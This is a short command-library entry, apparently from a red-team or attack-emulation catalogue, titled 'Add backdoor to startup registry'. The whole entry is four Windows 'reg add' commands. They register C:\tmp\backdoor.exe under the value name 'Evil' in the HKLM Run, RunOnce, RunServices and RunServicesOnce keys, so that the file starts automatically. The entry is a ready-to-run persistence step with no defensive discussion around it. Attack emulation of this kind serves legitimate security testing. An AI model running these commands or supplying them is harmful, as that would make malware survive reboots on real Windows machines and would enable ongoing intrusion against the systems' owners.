---
id: 742ca3a7-e2de-461d-ab3a-4df462f5c902
name: Add backdoor to startup registry
type: command
executor: bash
data: 'reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
  /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"

  reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v
  Evil /t REG_SZ /d "C:\tmp\backdoor.exe"

  reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices"
  /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"

  reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
  /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"'
output: null
created_at: '2023-04-06T03:56:27.989011+00:00'
updated_at: '2023-04-10T20:37:29.365401+00:00'
---

# Add backdoor to startup registry

```bash
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
```
